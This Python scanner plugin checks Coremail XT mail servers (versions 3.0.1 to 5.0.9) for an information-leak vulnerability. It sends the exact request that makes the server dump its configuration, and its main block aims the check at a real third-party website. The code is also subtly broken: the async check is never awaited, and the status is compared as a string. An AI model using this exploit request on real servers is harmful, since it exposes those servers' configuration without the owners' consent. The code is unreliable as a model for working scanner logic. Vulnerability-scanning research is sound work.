#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class Coremail_Information_Leak_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': '论客邮箱信息泄露漏洞',
            'description': '论客邮箱信息泄露漏洞,影响范围为: Coremail XT 3.0.1至XT 5.0.9版本',
            'date': '2019-05-22',
            'exptype': 'check',
            'type': 'Info'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            req = await request.get(self.url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/", headers = self.headers)
            if req.status != '404' and '/home/coremail' in await req.text():
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    Coremail_Information_Leak = Coremail_Information_Leak_BaseVerify('http://www.baidu.com')
    Coremail_Information_Leak.check()
